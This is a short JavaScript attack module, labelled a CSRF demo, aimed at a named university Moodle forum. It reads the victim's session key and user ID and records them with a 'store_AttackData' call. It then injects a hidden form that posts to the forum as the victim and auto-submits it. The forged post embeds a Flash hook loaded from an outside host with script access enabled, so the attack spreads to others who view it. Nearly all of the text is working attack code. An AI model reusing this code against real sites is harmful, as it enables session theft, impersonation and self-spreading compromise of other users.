//CSRF DEMO
var attack_module = 'moodle-lecturer-post.js';

var sess = document.getElementsByName('sesskey');
var sesskey = sess[0].value;

var user = document.getElementsByName('user');
var userid = user[0].value; 

//Csrf with dom elements.
var data = '<h1>CSRF</h1><form autocomplete="off" action="http://moodle.dcu.ie/mod/forum/post.php" method="post" accept-charset="utf-8" name="csrfform" id="csrfform" class="csrfform" enctype="multipart/form-data"><input name="MAX_FILE_SIZE" type="hidden" value="1048576000" /><input name="subscribe" type="hidden" value="1" /><input name="timestart" type="hidden" value="0" /><input name="timeend" type="hidden" value="0" /><input name="course" type="hidden" value="37362" /><input name="forum" type="hidden" value="37889" /><input name="discussion" type="hidden" value="0" /><input name="parent" type="hidden" value="0" /><input name="userid" type="hidden" value="'+userid+'" /><input name="groupid" type="hidden" value="" /><input name="edit" type="hidden" value="0" /><input name="reply" type="hidden" value="0" /><input name="sesskey" type="hidden" value="'+sesskey+'" /><input name="_qf__mod_forum_post_form" type="hidden" value="1" /><input name="subject" type="hidden" value="Important Message"/><input name="message" type="hidden" value="<embed code=http://makthepla.net/hook.swf allowscriptaccess=always><h1>Eample CSRF</h1>"/><input name="submitbutton" type="hidden" value="Post to forum" /></form>';

//Store the session key + userid of the victim
store_AttackData("Session Key = "+sesskey+" User Id="+userid);

$('body').append(data);
$('#csrfform').submit();
